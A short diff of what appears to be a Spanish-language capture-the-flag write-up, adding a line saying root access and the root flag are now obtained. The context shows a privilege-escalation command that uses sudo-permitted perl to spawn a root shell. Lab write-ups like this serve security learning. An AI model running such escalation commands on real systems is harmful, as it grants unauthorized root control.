@@ -124,3 +124,4 @@ Podemos ver que podemos ejecutar un comando perl para poder escalar privilegios
 ```
 sudo perl -e 'exec "/bin/sh";'
 ```
+Ahora ya tendriamos acceso a root y a su flag.
